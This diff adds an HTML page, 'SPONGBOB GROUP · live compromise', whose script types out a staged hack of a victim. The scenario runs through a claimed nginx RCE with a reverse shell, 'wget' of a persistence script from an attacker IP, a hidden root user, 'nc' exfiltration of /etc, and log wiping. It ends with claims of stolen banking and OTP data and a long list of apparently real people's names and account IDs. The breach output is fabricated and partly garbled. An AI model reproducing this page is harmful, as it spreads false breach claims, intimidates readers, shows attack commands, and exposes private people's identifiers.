@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>SPONGBOB GROUP · live compromise</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 8px;
+        }
+        .terminal-wrapper {
+            width: 100%;
+            max-width: 1000px;
+            background: transparent;
+            display: flex;
+            flex-direction: column;
+        }
+        .terminal-header {
+            background: #0a0a0a;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #1e4a4a;
+        }
+        .terminal-dots {
+            display: flex;
+            gap: 10px;
+        }
+        .dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #3a4a4a;
+            box-shadow: inset 0 -1px 2px #000;
+        }
+        .dot.red { background: #ed6a5e; }
+        .dot.yellow { background: #f5bd4f; }
+        .dot.green { background: #61c454; }
+        .terminal-title {
+            color: #2e8b8b;
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+            flex: 1;
+            text-align: center;
+        }
+        .terminal-screen {
+            background: #0b0b0b;
+            padding: 20px 18px 18px 18px;
+            height: 580px;
+            overflow-y: auto;
+            scroll-behavior: smooth;
+            color: #bfecec;
+            font-size: 1rem;
+            line-height: 1.5;
+            border: none;
+            box-shadow: inset 0 0 40px #000000;
+        }
+        .terminal-screen p {
+            margin: 0;
+            padding: 2px 0;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: 'Courier New', Courier, monospace;
+            border-bottom: 1px dotted rgba(0, 150, 150, 0.1);
+            min-height: 1.5em;
+        }
+        .system { color: #7fc9c9; }
+        .command { color: #b4ffb4; font-weight: 600; text-shadow: 0 0 5px #1f9; }
+        .output { color: #b4e0e0; }
+        .info { color: #7fd9ff; }
+        .success { color: #84f084; font-weight: 600; }
+        .error { color: #ff8a8a; }
+        .warning { color: #f5e98c; }
+        .target-prompt { color: #ffb482; font-weight: 600; }
+        .target-command { color: #fad6b3; }
+
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 1.2em;
+            background-color: #3cf;
+            vertical-align: middle;
+            margin-left: 2px;
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .terminal-screen::-webkit-scrollbar {
+            width: 8px;
+            background: #102020;
+        }
+        .terminal-screen::-webkit-scrollbar-thumb {
+            background: #2c6b6b;
+            border-radius: 6px;
+        }
+        .footer-note {
+            background: #0a0f0f;
+            padding: 8px 16px;
+            color: #2f6f6f;
+            font-size: 0.75rem;
+            text-align: center;
+            border-top: 1px solid #1d4a4a;
+        }
+        .footer-note i {
+            color: #3fa0a0;
+            font-style: normal;
+        }
+    </style>
+</head>
+<body>
+<div class="terminal-wrapper">
+    <div class="terminal-header">
+        <div class="terminal-dots">
+            <span class="dot red"></span>
+            <span class="dot yellow"></span>
+            <span class="dot green"></span>
+        </div>
+        <div class="terminal-title"></div>
+        <div style="width: 48px;"></div>
+    </div>
+
+    <div class="terminal-screen" id="terminalOutput"></div>
+
+    <div class="footer-note">
+        <i> target server http://127.0.0.1:8080.443 </i>
+    </div>
+</div>
+
+<script>
+(function() {
+    "use strict";
+    const outputDiv = document.getElementById('terminalOutput');
+    if (!outputDiv) return;
+    outputDiv.innerHTML = '';
+
+    // ========== SKENARIO SERANGAN (dengan efek mengetik) ==========
+    const steps = [
+        // -- BOOT SYSTEM --
+        { text: " __________________________", class: "system", delay: 200 },
+        { text: "🌐 IP Address: 36.50.57.101)", class: "system", delay: 200 },
+        { text: "🌐 EMAIL/USERNAME: admin@gmail.com", class: "system", delay: 200 },
+        { text: "🌐 PASSWORD: password123)", class: "system", delay: 200 },
+        { text: "🌐 LOCATION: -6.208800, 106.845600)", class: "system", delay: 200 },
+        { text: "🌐 TIMEZONE: Asia/Jakarta [  OK  ] (DHCP lease 192.168.17.42)", class: "system", delay: 300 },
+        { text: "🌐 Postal Code: 61351: [  OK  ] (DHCP lease 192.168.17.42)", class: "system", delay: 300 },
+        { text: "🌐 USER AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64)", class: "system", delay: 200 },
+        { text: "🌐 Region: Location of Surabaya Regency, East Java Indonesia : [  OK  ]", class: "system", delay: 250 },
+        { text: "🌐 Google Maps: https://maps.google.com/?q=-6.46444,106.797: [  OK  ]", class: "system", delay: 300 },
+        { text: "", class: "", delay: 150 },
+        { text: "🌐 Longitude: 106.797)", class: "system", delay: 200 },
+        { text: "Last login: " + new Date().toLocaleString('en-US', { month:'short', day:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit' }), class: "system", delay: 300 },
+        { text: "", class: "", delay: 150 },
+
+        // -- UPDATE DAN INSTALL TOOLS --
+        { text: "root@kali:~# ", class: "command", delay: 200 },
+        { text: "root@kali:~# apt update -qq", class: "command", delay: 400 },
+        { text: "Hit:1 http://kali.download/kali kali-rolling InRelease", class: "output", delay: 200 },
+        { text: "Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [16.5 MB]", class: "output", delay: 300 },
+        { text: "Fetched 16.5 MB in 4s (4125 kB/s)", class: "output", delay: 250 },
+        { text: "Reading package lists... Done", class: "output", delay: 200 },
+        { text: "", class: "", delay: 200 },
+
+        { text: "root@kali:~# apt install -y exploit-tool backdoor-utils", class: "command", delay: 600 },
+        { text: "Reading package lists... Done", class: "output", delay: 200 },
+        { text: "Building dependency tree... Done", class: "output", delay: 200 },
+        { text: "The following NEW packages will be installed:", class: "output", delay: 200 },
+        { text: "  exploit-tool backdoor-utils", class: "output", delay: 200 },
+        { text: "0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.", class: "output", delay: 200 },
+        { text: "Need to get 2,891 kB of archives.", class: "output", delay: 200 },
+        { text: "Get:1 http://kali.download/kali kali-rolling/main amd64 exploit-tool amd64 2.4.1 [1,567 kB]", class: "output", delay: 350 },
+        { text: "Get:2 http://kali.download/kali kali-rolling/main amd64 backdoor-utils amd64 1.3.7 [1,324 kB]", class: "output", delay: 300 },
+        { text: "Fetched 2,891 kB in 3s (964 kB/s)", class: "output", delay: 250 },
+        { text: "Selecting previously unselected package exploit-tool.", class: "output", delay: 200 },
+        { text: "Unpacking exploit-tool (2.4.1) ...", class: "output", delay: 300 },
+        { text: "Selecting previously unselected package backdoor-utils.", class: "output", delay: 200 },
+        { text: "Unpacking backdoor-utils (1.3.7) ...", class: "output", delay: 300 },
+        { text: "Setting up exploit-tool (2.4.1) ...", class: "output", delay: 250 },
+        { text: "Setting up backdoor-utils (1.3.7) ...", class: "output", delay: 250 },
+        { text: "Processing triggers for libc-bin (2.36-9) ...", class: "output", delay: 200 },
+        { text: "", class: "", delay: 250 },
+
+        // -- MULAI SERANGAN --
+        { text: "root@kali:~# exploit-tool --target 10.10.13.37 --full-scan", class: "command", delay: 600 },
+        { text: "[*] exploit-tool 2.4.1 — advanced multi‑handler", class: "info", delay: 250 },
+        { text: "[*] Target  : 10.10.13.37 (remote host)", class: "info", delay: 200 },
+        { text: "[*] Starting full port scan (1-65535) with evasion", class: "info", delay: 400 },
+        { text: "[+] Port   22/tcp open  →  SSH (OpenSSH 8.2p1)", class: "success", delay: 200 },
+        { text: "[+] Port   80/tcp open  →  HTTP (nginx 1.18.0)", class: "success", delay: 200 },
+        { text: "[+] Port  443/tcp open  →  HTTPS (nginx)", class: "success", delay: 200 },
+        { text: "[+] Port 3306/tcp open  →  MySQL (5.7.35)", class: "success", delay: 200 },
+        { text: "[*] OS fingerprinting active...", class: "info", delay: 300 },
+        { text: "[+] Detected OS: Ubuntu 20.04.4 LTS (Focal Fossa)", class: "success", delay: 300 },
+        { text: "[*] Searching for known vulnerabilities...", class: "info", delay: 350 },
+        { text: "[!] CVE-2021-3449 (OpenSSL 1.1.1f) – possible mitm", class: "error", delay: 300 },
+        { text: "[!] CVE-2022-0778 (OpenSSL) – denial of service", class: "error", delay: 300 },
+        { text: "[+] CVE-2021-23017 (nginx 1.18.0) – path traversal + RCE", class: "success", delay: 350 },
+        { text: "[*] Targeting nginx vulnerability...", class: "info", delay: 250 },
+        { text: "[*] Crafting payload: linux/x64/shell_reverse_tcp (LHOST=192.168.17.42, LPORT=5555)", class: "info", delay: 400 },
+        { text: "[*] Sending exploit via HTTP GET /..%2f..%2f..%2fbin/sh", class: "info", delay: 450 },
+        { text: "[+] Exploit sent – server returns 200 OK", class: "success", delay: 300 },
+        { text: "[*] Waiting for callback...", class: "info", delay: 600 },
+        { text: "[!] Firewall detected! using HTTP tunnel encoding", class: "error", delay: 400 },
+        { text: "[*] Switching to chunked encoding + base64 payload", class: "info", delay: 350 },
+        { text: "[+] Connection established! session opened to 192.168.17.42:5555", class: "success", delay: 500 },
+
+        // -- AKSES DI TARGET (lebih panjang) --
+        { text: "root@target:/# ", class: "target-prompt", delay: 250 },
+        { text: "root@target:/# whoami", class: "target-command", delay: 250 },
+        { text: "root", class: "output", delay: 150 },
+        { text: "root@target:/# hostnamectl", class: "target-command", delay: 350 },
+        { text: "   Static hostname: victim-server", class: "output", delay: 150 },
+        { text: "   Operating System: Ubuntu 20.04.4 LTS", class: "output", delay: 150 },
+        { text: "   Kernel: Linux 5.4.0-99-generic", class: "output", delay: 200 },
+        { text: "root@target:/# ifconfig eth0", class: "target-command", delay: 300 },
+        { text: "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500", class: "output", delay: 150 },
+        { text: "        inet 10.10.13.37  netmask 255.255.255.0  broadcast 10.10.13.255", class: "output", delay: 150 },
+        { text: "root@target:/# cat /etc/passwd | grep -E 'root|admin'", class: "target-command", delay: 400 },
+        { text: "root:x:0:0:root:/root:/bin/bash", class: "output", delay: 150 },
+        { text: "admin:x:1001:1001:Administrator,,,:/home/admin:/bin/bash", class: "output", delay: 150 },
+        { text: "", class: "", delay: 200 },
+
+        // -- LANJUTAN SERANGAN: MENGUPLOAD BACKDOOR, PERSISTENCE, DATA EXFIL --
+        { text: "root@target:/# cd /tmp", class: "target-command", delay: 250 },
+        { text: "root@target:/tmp# wget http://192.168.17.42/persist.sh", class: "target-command", delay: 400 },
+        { text: "Connecting to 192.168.17.42:80... connected.", class: "output", delay: 200 },
+        { text: "HTTP request sent, awaiting response... 200 OK", class: "output", delay: 200 },
+        { text: "Length: 3456 (3.4K) [text/x-sh]", class: "output", delay: 200 },
+        { text: "Saving to: 'persist.sh'", class: "output", delay: 200 },
+        { text: "100%[====================================>] 3,456  --.-K/s   in 0.02s", class: "output", delay: 300 },
+        { text: "root@target:/tmp# chmod +x persist.sh", class: "target-command", delay: 250 },
+        { text: "root@target:/tmp# ./persist.sh --install", class: "target-command", delay: 400 },
+        { text: "[+] Adding cron job for persistence (every 10 min)", class: "info", delay: 300 },
+        { text: "[+] Creating hidden user 'syslogd' with UID 0", class: "info", delay: 350 },
+        { text: "[+] Backdoor installed. Persistence ready.", class: "success", delay: 400 },
+        { text: "root@target:/tmp# cat /root/flag.txt", class: "target-command", delay: 350 },
+        { text: "CTF{full_compromise_2025_simulated}", class: "success", delay: 400 },
+        { text: "", class: "", delay: 200 },
+
+        // -- EKSPFILTRASI DATA --
+        { text: "root@target:/tmp# tar czf /tmp/etc_backup.tar.gz /etc", class: "target-command", delay: 500 },
+        { text: "tar: Removing leading `/' from member names", class: "output", delay: 200 },
+        { text: "root@target:/tmp# nc 192.168.17.42 6666 < etc_backup.tar.gz", class: "target-command", delay: 400 },
+        { text: "[*] Sending 1.2MB of config data...", class: "info", delay: 500 },
+        { text: "[+] Transfer complete (MD5: 3f7c9a1b2d8e5f4a)", class: "success", delay: 300 },
+
+        // -- PENGHAPUSAN JEJAK --
+        { text: "root@target:/tmp# rm -f persist.sh etc_backup.tar.gz", class: "target-command", delay: 300 },
+        { text: "root@target:/tmp# > /var/log/auth.log", class: "target-command", delay: 350 },
+        { text: "root@target:/tmp# history -c", class: "target-command", delay: 250 },
+        { text: "root@target:/tmp# exit", class: "target-command", delay: 400 },
+        { text: "[*] Session 10.10.13.37 closed", class: "info", delay: 300 },
+
+        // -- KEMBALI KE KALI --
+        { text: "root@kali:~# ", class: "command", delay: 300 },
+        { text: "root@kali:~# echo 'Target data username,email,password,OTP code, telephone number,location history, banking data,visa card.'", class: "command", delay: 400 },
+        { text: "root@kali:~# ", class: "command", delay: 300 },
+        { text: "root@kali:~# echo ''\\x00\\x14\\x50\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x3a\\x43\\x4c\\x49\\x2d\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74''", class: "command", delay: 400 },
+        { text: "root@kali:~# ", class: "command", delay: 300 },
+        { text: "root@kali:~# echo 'Use this section to access data https://github.com/foxglovesec/JavaUnserializeExploits.'", class: "command", delay: 400 },
+        { text: "#berdamai pada pikiran,nafsu dan akal itu lebih sulit mending ngopi bareng....☕☕☕# 🤕🤕🤕🤕", class: "output", delay: 200 },
+        { text: "root@kali:~# ", class: "command", delay: 300 },
+        { text: "root@kali:~# echo 'https://apiloggernet.servernet-boot.workers.dev/.'", class: "command", delay: 400 },
+        { text: "Test server: open http://192.168.0.1/index.html/admin.php", class: "output", delay: 200 },       
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....10%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....11%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....12%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....15%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....16%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....17%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....18%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....19%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....20%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....21%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....22%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....23%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....24%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....25%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....26%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....27%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....28%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....29%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....30%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....31%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....32%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....35%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....36%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....37%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....38%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....39%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....40%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....50%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....52%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....53%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....54%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....55%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....56%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....57%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....58%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....59%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....60%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....61%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....62%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....65%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....66%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....67%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....68%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....69%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....70%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....71%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....72%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....73%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....74%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....75%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....76%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....77%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....78%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....79%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....80%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....81%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....82%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....85%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....86%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....87%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....88%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....89%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....90%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....91%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....92%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....93%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....94%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....95%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....96%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....97%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....98%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....99%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....100%⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....succses⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....succses⚠️", class: "output", delay: 200 },
+        { text: "accses data proccesing....succses⚠️", class: "output", delay: 200 },
+        { text: "root@kali:~# logs file ➡️'61571713994791|Nuragung Gumelar100011426006028|Su Santi100004088255205|Shela Prasiska100000658284728|Muhamad Ruli Nopendi61582576971478|Atika Hako Ika100094673418381|Mardia Sisri61557879921840|Ahie Samsudin100028404830224|Erna Bunne61551761440169|Chicy100085014250157|Khyaa Mell61564109786119|Said Hamidi100013837444771|Yathee Abdullah61586558984232|Tiki Ki61582330281711|Reniputri Putri100006091668169|Umar Suhat Manto100052271796787|Lilik Lita100041963682445|Riki Hamdani100060906476255|Wa Wawan100027017654463|Usman Harun100040027488665|Rina Sihombing61556010547863|Wildanafit Afit100057059079382|Dimas Ajaa100002701368480|Ayyuu Aurel61573524689969|Tintin Supartini61557457637516|Rais Selang100064494528220|Mohammad Manap61582743132967|Sisi Datunsolang100002924569900|Puji Heryanto61554373463819|Boniara Alfredo100052174741288|Yopi Nopiawan100003660017970|Dendi Hidayat100030138906266|Bien100010004793389|Eka Marwati Eka Marwati61571454264401|Yus Rombot61573940075424|Nur Hadi100009283911899|Widarti Ningsih100041277660135|M M Nafisha100013920289408|Orna Alung100007459931027|Renny Hera61561035152801|Haryati Zahra100049118950887|Kartini Tini100002615919754|Sridara Agustiara100001726974700|Retdra Tyas100006792466072|Sri Sastrawan100032099191351|Ummy61585958437400|Boss J100026680182961|Hana Kamilatun Nisa100005859728639|Apinci Istana Cinta100055600367373|Anisiana100088420247116|Sambo Lado100003489233362|Lusiana Tanga Toding100021732079693|Faeri Karuniaman Waruwu100030323272119|T Situmorang61583130174714|Eka Srianti61551931520047|Heri Heri61556433633129|Salmawati Makka100008045259921|Maria Katharina Nona Erna100059174774112|Salma Buju100008368680927|Usia Parulian Napitupulu MKom61586544944863|Sahroni Islam100088716037554|Dahlan Surbakti61577786071731|Anggeysa Tulangow61555978007444|Kilan Dasman61586783313368|Sulton Widyan100022114721579|Adelino Santos61581477385154|Yermi Adu100068734657743|Mardinn Sihombing100053879062584|Arya Noer Bahtiar100053364731358|Tiur Maida Rajagukguk61583324723207|Hadi Surahman100001398100850|Lg Witari Indah61559387379928|Uus Usman Hilmy100066511461771|Langi Kiroo61568117607325|Rusiana Ana100086038235333|Babong Bonde Simanon Yandri100088181505920|Parman61584624241799|Ayu Wandira100002084629548|Olan Lawalata100009742247922|Yulita100057204819892|Yuheta100004267878920|Vidal Pereira100065407421430|Rusdi Arsad100089579650480|Amo Dewe100044007981874|Teken Wmi100007084479887|Muhammad Rifa'i100027123682226|Berlinda Siregar100001460380162|Vicky Lyu Sagita Sinulingga61583410445758|Madun Khia100000396698644|Aldy Monareh100036497496011|Yon Maryono100001665418075|Yuwisna Danial Mahajani100092861078832|Akmal Wijaya100017190796938|Ahul Idayz100011552221122|Demtus Iyo100088556928595|Puji W100084134887965|Komang Sariani100014698693961|Mas Har Soyo100070086253719|Kismawati Kismawati100085005060168|Supa Tmi100037434557575|Surya Ningsih100068431832731|Hpipa Rudi61585844067812|Hotniel Simorangkir100015339106153|Zulfira Husain100075712230672|Dian Wulandari100050923489672|Arbaniswan61567714450367|Bombong Abidin100052877170532|Ahmad Muzayin100089332353523|Sandy Lekatompessy100035462198792|Vlog Channel Nayla Nainggolan100048602376193|Pandi100054422813174|Yan61557544364264|Misno Mebel100015810554626|Agesti Wilian61578920396155|Sutiono Ono100034704392519|Freitas100006656350776|Firmanbewox100089731113432|Julianti Sri61561431862649|Ama Aldryan Hia100045790939049|Daniel Sosilong100084094849425|Suhermin Hery100006384642278|Delima Hok100010643947541|Maury Shafiq100015202183927|Rohmi Putri ADesla100009498155079|Ahmad Fuad61579756945601|Yhnaeb100001734339878|Cha Santosa100087395585859|Anisa Keyra100027537378584|Muhammad Rafi Rina Solihin100012758160934|Zubed Putra Kelana61564677551355|Putera Rezandriko100080912529739|Delima Lumbangaol100052855031688|Iwan Raja100084456871632|Lutfi100046837631483|Tina Citra100005502944728|Irma Sanul100016155736170|R Nopianti100020946622791|Farhanaan61584671918330|Muh Ishak61573887325118|Roy Roy100000679479675|Yuliana Wili100011529010388|Neva Nts61550310434849|Musafir Musafir61569153532667|Ita Maria Soouna100087584103792|Tofan Tanimbar100007741441811|Ningg Paputungan61550478275339|Wiwik Hasanah100001674192908|Sry Juliana100079942450675|Liny Merry100042265993096|Zidanpratama61557207307722|Vina Restiana100048074565866|Meswanto100063841239832|Muhammad Iqbal100030801067443|Jhuano100075581332497|Romadon Harahap100041885483322|Idha Mayanthy100000352745513|Harri Darmawan1768858543|Triska April MeLia100089243680284|Felix Temek100000920826679|Dex Anom61551871614905|Suma Camba1691256924|Primson Purba61550696277802|Ana Fiani100046390622278|Lhita Sheftia100022412557261|Yophi Ariffianto100089119761547|Bunga Melati100066587103633|Bappa Hafiz100009362435236|Nova Ci Putry Tunggal61556733824335|Cha Ndablek Ko An61583975364180|Ppa Muda61577105736638|Uri Danuri61576323006383|Andi Ferbriansyah100048790541962|Budi Haryadi100012274189114|Rieske J Maningkas100014200336659|Ella Dora100061800257659|Feike Walangitan100015909034228|Dana Unwakoly100094549314315|Andre Yudhistira100034355825893|Nanda Aisya61565720377106|Dewi Bunga61573954286340|Miftakhul umaiyah100072613176893|Katerina Ratuandung61576711283152|Irak Aza Gen100008766254397|Afidan Halid100026619737547|Suprin Guale61581688648867|Roman Simamora61562880244106|Tuki Ni100010857964775|Qiu Qiu100059369168998|RoyalSandi100016015061696|Abdul Dulloh61551519413838|Frangklin Pangau100088357208855|Angelia Luisia Mutiara Butarbutar61583959058441|Hendra Ajja100052889406671|Sumarsih100045957803737|Basri100034941167041|Fiona Fitriani100002052294138|Lukas L61575421331329|Darma Purba61572768696046|Gilang Prasetyoaji61584184740760|Pangrib Pangrib61560009264203|Mimi Mimipelani100010744544476|Djas Manto AE100082207032323|Zaenudin Asep61582685320944|Bambang Berkah Ramadhan100023679017301|Herman Herman Gacor100053265168715|Sannara Wastra100046302276577|Haerudin Heru100081178746885|Cinta Vanissa100054164524601|Mari Purnawan61584807913051|Ahmad Jaya Jhay100018161831583|Farida Ariyani100009206606702|Def Diesel100091735538859|Gunawan Dedek100078629023880|Muh Takdir61582770736799|Siti Marfuah Marfuah100082883084689|Milk Tea61586584055360|Kaisar Bastian100006630248266|Rudi Anto100002371006987|نعم فاءزين فاءيز100047356694404|Gustian Di100091737974324|Muhammad Husaini'", class: "command", delay: 400 },
+        { text: "root@kali:~# ", class: "command", delay: 200 }
+    ];
+
+    // ========== TYPING EFFECT ENGINE ==========
+    let currentStep = 0;
+    let currentChar = 0;
+    let currentLineElement = null;
+    let timeoutId = null;
+
+    function clearTimer() {
+        if (timeoutId) {
+            clearTimeout(timeoutId);
+            timeoutId = null;
+        }
+    }
+
+    function typeNextCharacter() {
+        // Jika semua langkah selesai
+        if (currentStep >= steps.length) {
+            // Tambahkan cursor pada prompt terakhir
+            const lastElement = outputDiv.lastElementChild;
+            if (lastElement && lastElement.classList.contains('command') && lastElement.textContent === 'root@kali:~# ') {
+                lastElement.innerHTML = lastElement.textContent + '<span class="cursor"></span>';
+            }
+            return;
+        }
+
+        const step = steps[currentStep];
+        const fullText = step.text;
+
+        // Jika belum ada elemen untuk baris ini, buat elemen <p> baru
+        if (!currentLineElement) {
+            currentLineElement = document.createElement('p');
+            if (step.class) {
+                currentLineElement.classList.add(step.class);
+            }
+            outputDiv.appendChild(currentLineElement);
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+
+        // Jika masih ada karakter yang perlu diketik
+        if (currentChar < fullText.length) {
+            const nextChar = fullText[currentChar];
+            currentLineElement.textContent += nextChar;
+            currentChar++;
+
+            // Kecepatan mengetik (acak untuk efek realistis)
+            let typingSpeed = 30; // default
+            if (step.class === 'command' || step.class === 'target-command') {
+                typingSpeed = 40 + Math.floor(Math.random() * 60); // 40-100 ms (lebih lambat untuk perintah)
+            } else if (step.class === 'output' || step.class === 'info' || step.class === 'system') {
+                typingSpeed = 10 + Math.floor(Math.random() * 30); // 10-40 ms (lebih cepat)
+            } else {
+                typingSpeed = 15 + Math.floor(Math.random() * 20); // baris biasa
+            }
+
+            timeoutId = setTimeout(typeNextCharacter, typingSpeed);
+        } else {
+            // Baris selesai diketik
+            currentChar = 0;
+            currentLineElement = null;
+            currentStep++;
+
+            // Jeda setelah baris sesuai delay (dari properti delay)
+            const delay = step.delay !== undefined ? step.delay : 250;
+            timeoutId = setTimeout(typeNextCharacter, delay);
+        }
+    }
+
+    // Mulai simulasi setelah halaman dimuat
+    window.addEventListener('load', () => {
+        outputDiv.innerHTML = '';
+        // Hapus class cursor-line yang mungkin ada dari CSS (kita pakai .cursor)
+        typeNextCharacter();
+    });
+
+    window.addEventListener('beforeunload', () => {
+        clearTimer();
+    });
+})();
+</script>
+</body>
+</html>
